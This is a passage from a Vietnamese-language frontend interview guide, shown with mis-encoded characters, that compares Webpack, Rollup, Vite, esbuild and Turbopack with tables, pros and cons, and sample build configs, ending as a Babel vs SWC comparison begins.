| **Trunk-Based** | Team giá»i, CI/CD máº¡nh | Cá»±c Ä‘Æ¡n giáº£n | Cáº§n tests tá»‘t, feature flags |

| Ká»¹ thuáº­t | Khi nÃ o dÃ¹ng | TrÃ¡nh |
|----------|--------------|-------|
| **Merge** | Public branches (main, develop) | Feature branches (history rá»‘i) |
| **Rebase** | Feature branches (local) | Public branches (conflicts team) |
| **Feature Flags** | Features lá»›n, A/B testing | Features nhá» (overhead) |

---

### **ğŸ¯ Best Practices Cuá»‘i CÃ¹ng**

**Senior Developer nÃªn:**

1. âœ… **Hiá»ƒu rÃµ Git Flow cá»§a team** - TuÃ¢n thá»§ quy táº¯c chung
2. âœ… **Pull code hÃ ng ngÃ y** - TrÃ¡nh conflicts lá»›n
3. âœ… **Small PRs** - 200-300 lines, dá»… review, merge nhanh
4. âœ… **Feature flags cho features lá»›n** - Deploy sá»›m, Ã­t conflicts
5. âœ… **Communicate vá»›i team** - Biáº¿t ai Ä‘ang lÃ m gÃ¬, trÃ¡nh Ä‘á»¥ng Ä‘á»™
6. âœ… **Code review ká»¹** - PhÃ¡t hiá»‡n conflicts logic sá»›m
7. âœ… **Rebase local, merge public** - History sáº¡ch nhÆ°ng an toÃ n
8. âœ… **CI/CD automation** - Tests tá»± Ä‘á»™ng, deploy tá»± Ä‘á»™ng

**ğŸ’¡ Remember:**
> "Git workflow tá»‘t = Ã­t conflicts + deploy nhanh + dá»… rollback. Communication > Tools!" ğŸš€
</details>

---
<details>
<summary><span style="font-size:1.25em;font-weight:bold;">âš¡ Q58: Build Tools - Vite vs Webpack vs Rollup, SWC vs Babel, Turbopack, esbuild</span></summary>


**â“ CÃ¢u Há»i:**
So sÃ¡nh cÃ¡c build tools hiá»‡n Ä‘áº¡i (cÃ´ng cá»¥ build): Vite, Webpack, Rollup, esbuild, Turbopack vÃ  transpilers (trÃ¬nh chuyá»ƒn Ä‘á»•i code): SWC vs Babel. Khi nÃ o nÃªn dÃ¹ng tool nÃ o?


#### **ğŸ“Š Build Tools Ecosystem - Tá»•ng Quan Há»‡ Sinh ThÃ¡i CÃ´ng Cá»¥ Build**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    BUILD TOOLS LANDSCAPE 2024                        â”‚
â”‚                 (Báº£n Äá»“ CÃ´ng Cá»¥ Build NÄƒm 2024)                     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                      â”‚
â”‚  ğŸ—ï¸ BUNDLERS (Module Bundling - ÄÃ³ng GÃ³i Module)                    â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚  â€¢ Webpack     - LÃ¢u Ä‘á»i nháº¥t, config phá»©c táº¡p (2012)         â”‚ â”‚
â”‚  â”‚                  NhÆ° Ã´ng giÃ  giÃ u kinh nghiá»‡m                  â”‚ â”‚
â”‚  â”‚  â€¢ Rollup      - ChuyÃªn vá» ESM, tree-shaking tá»‘t nháº¥t (2015)  â”‚ â”‚
â”‚  â”‚                  NhÆ° chuyÃªn gia dá»n rÃ¡c code                   â”‚ â”‚
â”‚  â”‚  â€¢ Vite        - Hiá»‡n Ä‘áº¡i, dev server siÃªu nhanh (2020)       â”‚ â”‚
â”‚  â”‚                  NhÆ° xe Ä‘ua F1                                  â”‚ â”‚
â”‚  â”‚  â€¢ Turbopack   - Viáº¿t báº±ng Rust, tÃ­ch há»£p Next.js (2022)      â”‚ â”‚
â”‚  â”‚                  NhÆ° tÃªn lá»­a SpaceX                             â”‚ â”‚
â”‚  â”‚  â€¢ esbuild     - Tá»‘c Ä‘á»™ khá»§ng, viáº¿t báº±ng Go (2020)            â”‚ â”‚
â”‚  â”‚                  NhÆ° mÃ¡y bay siÃªu thanh                         â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚                                                                      â”‚
â”‚  âš™ï¸ TRANSPILERS (Code Transformation - Chuyá»ƒn Äá»•i Code)             â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚  â€¢ Babel       - TÆ°Æ¡ng thÃ­ch tá»‘t nháº¥t, nhiá»u plugin (2014)    â”‚ â”‚
â”‚  â”‚                  NhÆ° thÃ´ng dá»‹ch viÃªn chuyÃªn nghiá»‡p             â”‚ â”‚
â”‚  â”‚  â€¢ SWC         - Viáº¿t báº±ng Rust, nhanh gáº¥p 20x Babel (2020)   â”‚ â”‚
â”‚  â”‚                  NhÆ° thÃ´ng dá»‹ch viÃªn AI siÃªu tá»‘c               â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

#### **1ï¸âƒ£ SO SÃNH CÃC BUNDLERS (CÃ´ng Cá»¥ ÄÃ³ng GÃ³i)**

**ğŸ“Š Báº£ng So SÃ¡nh Hiá»‡u Suáº¥t & TÃ­nh NÄƒng:**

| TÃ­nh NÄƒng | **Webpack** | **Rollup** | **Vite** | **esbuild** | **Turbopack** |
|---------|-------------|------------|----------|-------------|---------------|
| **Tá»‘c Ä‘á»™ Dev** (Cháº¡y dev server) | â­â­ Cháº­m | â­â­â­ Trung bÃ¬nh | â­â­â­â­â­ Nhanh | â­â­â­â­â­ Nhanh nháº¥t | â­â­â­â­â­ Nhanh nháº¥t |
| **Tá»‘c Ä‘á»™ Build** (Build production) | â­â­ 10 giÃ¢y | â­â­â­ 5 giÃ¢y | â­â­â­â­ 2 giÃ¢y | â­â­â­â­â­ 0.5 giÃ¢y | â­â­â­â­â­ 1 giÃ¢y |
| **Tree-shaking** (Loáº¡i bá» code thá»«a) | â­â­â­ Tá»‘t | â­â­â­â­â­ Tá»‘t nháº¥t | â­â­â­â­ Tá»‘t | â­â­â­â­ Tá»‘t | â­â­â­â­ Tá»‘t |
| **Code Splitting** (Chia nhá» bundle) | â­â­â­â­â­ Tá»‘t nháº¥t | â­â­â­â­ Tá»‘t | â­â­â­â­ Tá»‘t | â­â­â­ CÆ¡ báº£n | â­â­â­â­ Tá»‘t |
| **HMR** (Hot Module Reload - Cáº­p nháº­t nÃ³ng) | â­â­â­ Tá»‘t | â­â­ Cháº­m | â­â­â­â­â­ Tá»©c thÃ¬ | âŒ KhÃ´ng cÃ³ | â­â­â­â­â­ Tá»©c thÃ¬ |
| **Config** (Äá»™ phá»©c táº¡p cáº¥u hÃ¬nh) | â­â­ Phá»©c táº¡p | â­â­â­â­ ÄÆ¡n giáº£n | â­â­â­â­â­ Ráº¥t Ä‘Æ¡n giáº£n | â­â­â­ Háº¡n cháº¿ | â­â­â­â­ ÄÆ¡n giáº£n |
| **Plugins** (Há»‡ sinh thÃ¡i plugin) | â­â­â­â­â­ Khá»•ng lá»“ | â­â­â­â­ Tá»‘t | â­â­â­â­ Äang phÃ¡t triá»ƒn | â­â­ Háº¡n cháº¿ | â­â­ Má»›i |
| **Bundle Size** (KÃ­ch thÆ°á»›c file Ä‘Ã³ng gÃ³i) | â­â­â­ Tá»‘t | â­â­â­â­â­ Nhá» nháº¥t | â­â­â­â­ Tá»‘t | â­â­â­â­ Tá»‘t | â­â­â­â­ Tá»‘t |
| **Äá»™ trÆ°á»Ÿng thÃ nh** | â­â­â­â­â­ 12 nÄƒm | â­â­â­â­â­ 9 nÄƒm | â­â­â­â­ 4 nÄƒm | â­â­â­ 4 nÄƒm | â­â­ 2 nÄƒm |
| **Äá»™ khÃ³ há»c** | â­â­ KhÃ³ | â­â­â­â­ Dá»… | â­â­â­â­â­ Ráº¥t dá»… | â­â­â­â­ Dá»… | â­â­â­ Trung bÃ¬nh |

---

#### **ğŸ”¹ A. Webpack - "Ã”ng GiÃ  GiÃ u Kinh Nghiá»‡m"**

**ğŸ’¡ Tá»•ng Quan:**
- Bundler lÃ¢u Ä‘á»i nháº¥t, cáº¥u hÃ¬nh linh hoáº¡t (12 nÄƒm tuá»•i - ra Ä‘á»i 2012)
- Há»‡ sinh thÃ¡i plugin khá»•ng lá»“ (hÃ ng ngÃ n plugins)
- Dev server cháº­m, config phá»©c táº¡p (cÃ³ thá»ƒ 500+ dÃ²ng)
- PhÃ¹ há»£p nháº¥t cho app lá»›n, phá»©c táº¡p, enterprise

**âœ… Äiá»ƒm Máº¡nh (Strengths):**
1. **TrÆ°á»Ÿng ThÃ nh & á»”n Äá»‹nh**: 12 nÄƒm kiá»ƒm nghiá»‡m, production-ready
   - Má»i bugs Ä‘Ã£ Ä‘Æ°á»£c fix qua nhiá»u nÄƒm
   - Há»— trá»£ má»i edge cases
   - DÃ¹ng bá»Ÿi Facebook, Google, Microsoft

2. **Há»‡ Sinh ThÃ¡i Plugin Khá»•ng Lá»“**: HÃ ng ngÃ n plugins cÃ³ sáºµn
   - Muá»‘n gÃ¬ cÅ©ng cÃ³ plugin: CSS, images, fonts, WebAssembly
   - Cá»™ng Ä‘á»“ng lá»›n, dá»… tÃ¬m giáº£i phÃ¡p

3. **Code Splitting NÃ¢ng Cao**: Chiáº¿n lÆ°á»£c chia nhá» bundle phá»©c táº¡p
   - Dynamic imports: `import('./module').then(...)`
   - Split by route, vendor, common chunks
   - Tá»‘i Æ°u load time

4. **Quáº£n LÃ½ Assets ToÃ n Diá»‡n**: Images, fonts, CSS, má»i thá»©
   - Import áº£nh nhÆ° module: `import logo from './logo.png'`
   - Optimize images, fonts tá»± Ä‘á»™ng
   - CSS Modules, SASS, Less

5. **Há»— Trá»£ Rá»™ng RÃ£i**: LÃ m viá»‡c vá»›i má»i framework
   - React, Vue, Angular, Svelte, vanilla JS
   - CÃ³ template cho táº¥t cáº£

**âŒ Äiá»ƒm Yáº¿u (Weaknesses):**
1. **Dev Server Cháº­m**: Bundle toÃ n bá»™ app khi start
   - Cold start: ~10 giÃ¢y (bundle háº¿t 1000 files trÆ°á»›c)
   - Láº§n Ä‘áº§u cháº¡y `npm start` â†’ Ä‘á»£i lÃ¢u
   - KhÃ´ng phÃ¹ há»£p cho rapid prototyping

2. **Config Phá»©c Táº¡p**: webpack.config.js cÃ³ thá»ƒ 500+ dÃ²ng
   - Loaders, plugins, optimization rules
   - KhÃ³ há»c cho beginners
   - Dá»… config sai â†’ bugs khÃ³ debug

3. **HMR Cháº­m**: Re-bundle láº¡i khi thay Ä‘á»•i code
   - Má»—i láº§n sá»­a code: 1-2 giÃ¢y Ä‘á»ƒ cáº­p nháº­t
   - So vá»›i Vite (50ms) â†’ cáº£m giÃ¡c lag
   - Developer experience khÃ´ng tá»‘t

4. **Bundle Size Lá»›n**: Nhiá»u runtime code thá»«a
   - Webpack runtime + module system
   - File output lá»›n hÆ¡n Rollup ~20-30%
   - Page load cháº­m hÆ¡n

**ğŸ“Œ Khi NÃ o DÃ¹ng Webpack:**
- âœ… **App lá»›n cá»§a doanh nghiá»‡p** (legacy codebases cÃ³ sáºµn)
   - ÄÃ£ dÃ¹ng Webpack, khÃ´ng muá»‘n migrate
   - App phá»©c táº¡p vá»›i nhiá»u requirements Ä‘áº·c biá»‡t
   
- âœ… **Build phá»©c táº¡p**: Cáº§n config chi tiáº¿t
   - Multi-page apps (MPA)
   - Custom loaders, plugins Ä‘áº·c biá»‡t
   - Khi Vite/Rollup khÃ´ng Ä‘Ã¡p á»©ng Ä‘Æ°á»£c

- âœ… **Cáº§n plugin cá»¥ thá»ƒ**: Plugin chá»‰ cÃ³ trÃªn Webpack
   - Module Federation (micro-frontends)
   - Specialized loaders

- âœ… **Migration tá»« dá»± Ã¡n cÅ©**: Äang dÃ¹ng Webpack rá»“i
   - Chi phÃ­ migrate cao
   - "If it ain't broken, don't fix it"

**ğŸ”§ VÃ­ Dá»¥ Config (Webpack Configuration):**

```javascript
// webpack.config.js
const path = require('path');
const HtmlWebpackPlugin = require('html-webpack-plugin');
const MiniCssExtractPlugin = require('mini-css-extract-plugin');

module.exports = {
  mode: 'production', // Cháº¿ Ä‘á»™: 'development' hoáº·c 'production'
  entry: './src/index.tsx', // File Ä‘áº§u vÃ o (entry point)
  
  output: {
    path: path.resolve(__dirname, 'dist'), // ThÆ° má»¥c output
    filename: '[name].[contenthash].js', // TÃªn file output vá»›i hash (cache busting)
    clean: true, // XÃ³a thÆ° má»¥c dist cÅ© trÆ°á»›c khi build
  },
  
  // LOADERS - Xá»­ lÃ½ cÃ¡c loáº¡i file khÃ¡c nhau
  module: {
    rules: [
      // Rule 1: Xá»­ lÃ½ TypeScript/TSX
      {
        test: /\.(ts|tsx)$/, // Regex: file nÃ o match .ts hoáº·c .tsx
        use: 'babel-loader', // DÃ¹ng babel-loader Ä‘á»ƒ transpile
        exclude: /node_modules/, // Bá» qua node_modules (khÃ´ng cáº§n transpile)
      },
      // Rule 2: Xá»­ lÃ½ CSS
      {
        test: /\.css$/, // File .css
        use: [MiniCssExtractPlugin.loader, 'css-loader'], // Extract CSS ra file riÃªng
        // Cháº¡y tá»« pháº£i â†’ trÃ¡i: css-loader â†’ MiniCssExtractPlugin.loader
      },
      // Rule 3: Xá»­ lÃ½ Images
      {
        test: /\.(png|svg|jpg|jpeg|gif)$/i, // File áº£nh
        type: 'asset/resource', // Copy áº£nh vÃ o dist, return URL
      },
    ],
  },
  
  // PLUGINS - Má»Ÿ rá»™ng chá»©c nÄƒng Webpack
  plugins: [
    // Plugin 1: Táº¡o HTML file tá»± Ä‘á»™ng
    new HtmlWebpackPlugin({
      template: './public/index.html', // Template HTML
      // Tá»± Ä‘á»™ng inject <script> tag vÃ o HTML
    }),
    // Plugin 2: Extract CSS ra file riÃªng
    new MiniCssExtractPlugin({
      filename: '[name].[contenthash].css', // TÃªn file CSS vá»›i hash
    }),
  ],
  
  // OPTIMIZATION - Tá»‘i Æ°u hÃ³a bundle
  optimization: {
    splitChunks: {
      chunks: 'all', // Chia nhá» táº¥t cáº£ chunks
      cacheGroups: {
        // Táº¡o vendor bundle riÃªng cho node_modules
        vendor: {
          test: /[\\/]node_modules[\\/]/, // Match node_modules
          name: 'vendors', // TÃªn chunk: vendors.js
          priority: 10, // Æ¯u tiÃªn cao hÆ¡n (cháº¡y trÆ°á»›c)
        },
        // Result: app.js (code cá»§a báº¡n) + vendors.js (node_modules)
      },
    },
  },
  
  // RESOLVE - Cáº¥u hÃ¬nh cÃ¡ch resolve modules
  resolve: {
    extensions: ['.tsx', '.ts', '.js'], // Auto-resolve cÃ¡c extension nÃ y
    // import './App' â†’ tá»± tÃ¬m App.tsx, App.ts, App.js
  },
};
```

**â±ï¸ Hiá»‡u Suáº¥t Thá»±c Táº¿ (Performance):**
```
Dev Server Start:  ~10 giÃ¢y (cold start - láº§n Ä‘áº§u cháº¡y)
                   - Bundle toÃ n bá»™ app trÆ°á»›c
                   - Parse 1000+ files
                   - Transform vá»›i Babel
                   
HMR:               ~1-2 giÃ¢y (sau khi sá»­a code)
                   - Re-bundle pháº§n thay Ä‘á»•i
                   - Inject vÃ o browser
                   
Production Build:  ~10-30 giÃ¢y (tuá»³ kÃ­ch thÆ°á»›c app)
                   - Minify, optimize, tree-shake
                   - Generate source maps
```

---

#### **ğŸ”¹ B. Rollup - "ChuyÃªn Gia Dá»n RÃ¡c Code"**

**ğŸ’¡ Tá»•ng Quan:**
- Bundler chuyÃªn vá» ESM (ES Modules) - Æ°u tiÃªn module hiá»‡n Ä‘áº¡i
- Tree-shaking tá»‘t nháº¥t (loáº¡i bá» code khÃ´ng dÃ¹ng hiá»‡u quáº£ nháº¥t)
- LÃ½ tÆ°á»Ÿng cho libraries (React components, npm packages)
- Config Ä‘Æ¡n giáº£n, táº­p trung vÃ o má»¥c Ä‘Ã­ch

**âœ… Äiá»ƒm Máº¡nh (Strengths):**
1. **Tree-Shaking Tá»‘t Nháº¥t**: Loáº¡i bá» code thá»«a cá»±c ká»³ hiá»‡u quáº£
   - PhÃ¢n tÃ­ch static imports/exports
   - Chá»‰ giá»¯ láº¡i code thá»±c sá»± Ä‘Æ°á»£c dÃ¹ng
   - Bundle size nhá» hÆ¡n Webpack 20-30%
   - Example: Import 1 function tá»« lodash â†’ chá»‰ bundle function Ä‘Ã³ (khÃ´ng cáº£ lib)

2. **Bundle Nhá» Gá»n**: Ãt runtime code thá»«a
   - KhÃ´ng cÃ³ Webpack runtime overhead
   - Output code gáº§n nhÆ° vanilla JS
   - Perfect cho performance-critical apps

3. **ESM Native**: Sinh ra Ä‘á»ƒ lÃ m viá»‡c vá»›i ES Modules
   - `import/export` syntax
   - KhÃ´ng cáº§n transform CJS â†’ ESM
   - Future-proof (ESM lÃ  tÆ°Æ¡ng lai)

4. **Config ÄÆ¡n Giáº£n**: Dá»… hiá»ƒu, dá»… maintain
   - Ãt options hÆ¡n Webpack
   - Focused on core features
   - Beginners-friendly

5. **Multiple Output Formats**: Xuáº¥t ra nhiá»u Ä‘á»‹nh dáº¡ng
   - CJS (CommonJS) - cho Node.js
   - ESM (ES Modules) - cho browsers hiá»‡n Ä‘áº¡i
   - UMD (Universal Module Definition) - cho cáº£ browser & Node
   - IIFE (Immediately Invoked Function Expression) - cho <script> tag
   - â†’ Perfect cho library authors

**âŒ Äiá»ƒm Yáº¿u (Weaknesses):**
1. **Dev Server Cháº­m**: KhÃ´ng thiáº¿t káº¿ cho app development
   - KhÃ´ng cÃ³ dev server nhanh nhÆ° Vite
   - Pháº£i bundle láº¡i toÃ n bá»™ má»—i láº§n thay Ä‘á»•i
   - KhÃ´ng phÃ¹ há»£p cho large apps

2. **HMR Háº¡n Cháº¿**: Cáº§n thÃªm plugins
   - KhÃ´ng cÃ³ HMR built-in
   - Pháº£i cÃ i `rollup-plugin-hot` hoáº·c dÃ¹ng vá»›i Vite
   - DX khÃ´ng tá»‘t nhÆ° Webpack/Vite

3. **Ecosystem Nhá» HÆ¡n**: Ãt plugins hÆ¡n Webpack
   - ~200 plugins (vs Webpack ~5000)
   - Má»™t sá»‘ use cases khÃ´ng cÃ³ plugin ready
   - Pháº£i tá»± viáº¿t hoáº·c workaround

4. **Xá»­ LÃ½ Assets KÃ©m**: KhÃ´ng máº¡nh nhÆ° Webpack
   - Images, fonts, CSS khÃ´ng smooth
   - Cáº§n nhiá»u plugins Ä‘á»ƒ xá»­ lÃ½ assets
   - Webpack váº«n tá»‘t hÆ¡n cho asset-heavy apps

**ğŸ“Œ Khi NÃ o DÃ¹ng Rollup:**
- âœ… **PhÃ¡t triá»ƒn Library** (React components, npm packages)
   - Lodash, React, Vue Ä‘á»u dÃ¹ng Rollup
   - Cáº§n output nhá» gá»n
   - Export nhiá»u formats (CJS, ESM, UMD)
   
- âœ… **App nhá» Ä‘áº¿n trung bÃ¬nh**
   - KhÃ´ng cáº§n dev server nhanh
   - Æ¯u tiÃªn bundle size nhá»
   
- âœ… **Bundle size lÃ  critical**
   - Performance-sensitive apps
   - Mobile-first apps
   - Muá»‘n tá»‘i Æ°u load time

- âœ… **Publish npm package**
   - Cáº§n tree-shakeable output
   - Support nhiá»u mÃ´i trÆ°á»ng (Node, Browser)

**ğŸ”§ VÃ­ Dá»¥ Config (Rollup Configuration):**

```javascript
// rollup.config.js
import { defineConfig } from 'rollup';
import typescript from '@rollup/plugin-typescript';
import resolve from '@rollup/plugin-node-resolve';
import commonjs from '@rollup/plugin-commonjs';
import terser from '@rollup/plugin-terser';

export default defineConfig({
  input: 'src/index.ts', // File Ä‘áº§u vÃ o
  
  // OUTPUT - Xuáº¥t ra nhiá»u formats
  output: [
    // Format 1: CommonJS - cho Node.js
    {
      file: 'dist/bundle.cjs.js', // File output
      format: 'cjs', // CommonJS: require/module.exports
      sourcemap: true, // Táº¡o source map cho debugging
    },
    // Format 2: ESM - cho browsers hiá»‡n Ä‘áº¡i
    {
      file: 'dist/bundle.esm.js',
      format: 'esm', // ES Modules: import/export
      sourcemap: true,
    },
    // Format 3: UMD - universal (browser + Node)
    {
      file: 'dist/bundle.umd.js',
      format: 'umd', // UMD: cháº¡y má»i nÆ¡i
      name: 'MyLibrary', // TÃªn global variable trong browser
      sourcemap: true,
      // Usage: <script src="bundle.umd.js"></script>
      //        window.MyLibrary.someFunction()
    },
  ],
  
  // PLUGINS - Má»Ÿ rá»™ng chá»©c nÄƒng
  plugins: [
    resolve(), // Resolve node_modules
               // TÃ¬m dependencies trong node_modules
               
    commonjs(), // Convert CJS â†’ ESM
                // VÃ¬ Rollup chá»‰ hiá»ƒu ESM, pháº£i convert CJS packages
                
    typescript({ // Compile TypeScript
      tsconfig: './tsconfig.json',
      // Transpile .ts/.tsx â†’ .js
    }),
    
    terser(), // Minify code
              // NÃ©n code: xÃ³a whitespace, rename variables
              // bundle.js (100KB) â†’ bundle.min.js (30KB)
  ],
  
  // EXTERNAL - KhÃ´ng bundle dependencies nÃ y
  external: ['react', 'react-dom'], // Peer dependencies
  // LÃ½ do: Library sáº½ dÃ¹ng React cá»§a app consumer
  // KhÃ´ng nÃªn bundle React vÃ o library â†’ tÄƒng size, conflict version
});
```

**â±ï¸ Hiá»‡u Suáº¥t Thá»±c Táº¿ (Performance):**
```
Production Build:  ~5 giÃ¢y
                   - Nhanh hÆ¡n Webpack (~10-30s)
                   - Tree-shake hiá»‡u quáº£
                   
Bundle Size:       -30% nhá» hÆ¡n Webpack
                   - Ãt runtime code
                   - Tree-shaking tá»‘t hÆ¡n
                   
Example:
  Webpack: 150KB (minified)
  Rollup:  105KB (minified) â† Nhá» hÆ¡n 30%
```

---

#### **ğŸ”¹ C. Vite - Modern, Lightning Fast**

**ğŸ’¡ Overview:**
- Modern dev server (ESM-based)
- Instant server start
- Lightning-fast HMR
- Rollup for production

**âœ… Strengths:**
1. **Instant Dev Server**: No bundling, serve ES modules directly
2. **Fast HMR**: <50ms updates
3. **Simple Config**: Minimal setup
4. **Modern Stack**: Built for modern browsers
5. **Great DX**: Out-of-the-box TypeScript, JSX, CSS

**âŒ Weaknesses:**
1. **Modern Browsers Only**: Requires ESM support
2. **Smaller Ecosystem**: Newer than Webpack
3. **Production != Dev**: Uses Rollup for prod
4. **Large Projects**: Can slow down with 1000+ modules

**ğŸ“Œ Use Cases:**
- **Modern web apps** (React, Vue, Svelte)
- New projects (greenfield)
- Fast prototyping
- When DX is priority

**ğŸ”§ Example Config:**

```typescript
// vite.config.ts
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';
import path from 'path';

export default defineConfig({
  plugins: [react()],
  
  resolve: {
    alias: {
      '@': path.resolve(__dirname, './src'),
    },
  },
  
  build: {
    outDir: 'dist',
    sourcemap: true,
    rollupOptions: {
      output: {
        manualChunks: {
          vendor: ['react', 'react-dom'],
        },
      },
    },
  },
  
  server: {
    port: 3000,
    open: true,
  },
});
```

**â±ï¸ Performance:**
```
Dev Server Start:  ~500ms âš¡ (instant!)
HMR:               ~50ms âš¡
Production Build:  ~2-5 seconds (Rollup)
```

**ğŸ”¥ Why Vite is Fast:**

```typescript
// TRADITIONAL BUNDLER (Webpack)
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 1. Bundle ALL code                     â”‚
â”‚    â”œâ”€ node_modules (5MB)               â”‚
â”‚    â”œâ”€ src (1MB)                        â”‚
â”‚    â””â”€ Transform, minify, bundle        â”‚
â”‚    â†“ 10 seconds                        â”‚
â”‚ 2. Start dev server                    â”‚
â”‚ 3. Serve bundle                        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

// VITE (ESM-based)
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 1. Start dev server IMMEDIATELY âš¡      â”‚
â”‚    â†“ 500ms                             â”‚
â”‚ 2. Browser requests /src/App.tsx       â”‚
â”‚ 3. Transform ONLY requested file       â”‚
â”‚    â†“ 50ms                              â”‚
â”‚ 4. Serve ESM module                    â”‚
â”‚                                        â”‚
â”‚ âœ… Pre-bundle node_modules (esbuild)   â”‚
â”‚ âœ… Transform on-demand (lazy)          â”‚
â”‚ âœ… Native ESM (no bundling in dev)     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

#### **ğŸ”¹ D. esbuild - Extreme Speed (Go-based)**

**ğŸ’¡ Overview:**
- Written in Go (100x faster than JS)
- Extreme build speed
- Limited plugin ecosystem
- Used internally by Vite

**âœ… Strengths:**
1. **Blazing Fast**: 10-100x faster than Webpack
2. **Built-in**: TS, JSX, CSS, minification
3. **Simple API**: Easy to use
4. **Parallel Processing**: Multi-threaded

**âŒ Weaknesses:**
1. **Limited Plugins**: Small ecosystem
2. **No HMR**: Not designed for dev server
3. **Basic Features**: Less advanced than Webpack
4. **Go Required**: For plugin development

**ğŸ“Œ Use Cases:**
- **Build step in Vite/Turbopack**
- Minification tool
- Transpiling TypeScript
- CI/CD builds (speed critical)

**ğŸ”§ Example:**

```typescript
// esbuild.config.js
const esbuild = require('esbuild');

esbuild.build({
  entryPoints: ['src/index.tsx'],
  bundle: true,
  outfile: 'dist/bundle.js',
  minify: true,
  sourcemap: true,
  target: ['es2020'],
  loader: {
    '.ts': 'ts',
    '.tsx': 'tsx',
  },
  external: ['react', 'react-dom'],
}).catch(() => process.exit(1));
```

**â±ï¸ Performance:**
```
Production Build:  ~500ms âš¡âš¡âš¡ (10x faster than Webpack!)
Bundle Size:       Similar to Rollup
```

---

#### **ğŸ”¹ E. Turbopack - Next.js Native (Rust-based)**

**ğŸ’¡ Overview:**
- Rust-based bundler
- Built by Vercel for Next.js
- Incremental computation
- Replaces Webpack in Next.js

**âœ… Strengths:**
1. **Extreme Speed**: Rust-based, 10x faster than Webpack
2. **Incremental**: Caches everything
3. **Next.js Native**: Deep integration
4. **Future-proof**: Modern architecture

**âŒ Weaknesses:**
1. **Next.js Only**: Not standalone (yet)
2. **New**: Immature, bugs
3. **Limited Plugins**: Small ecosystem
4. **Rust Required**: For customization

**ğŸ“Œ Use Cases:**
- **Next.js apps** (experimental)
- Large Next.js projects
- When build speed is critical

**ğŸ”§ Example:**

```javascript
// next.config.js
/** @type {import('next').NextConfig} */
const nextConfig = {
  experimental: {
    turbo: {
      // Enable Turbopack
      loaders: {
        '.svg': ['@svgr/webpack'],
      },
    },
  },
};

module.exports = nextConfig;
```

**â±ï¸ Performance:**
```
Dev Server (Next.js):
- Webpack:  ~10 seconds
- Turbopack: ~1 second âš¡âš¡âš¡ (10x faster!)

HMR:
- Webpack:  ~1-2 seconds
- Turbopack: ~50ms âš¡âš¡âš¡
```

---

#### **2ï¸âƒ£ TRANSPILERS COMPARISON**

**ğŸ“Š Babel vs SWC:**

| Feature | **Babel** | **SWC** |
|---------|-----------|---------|
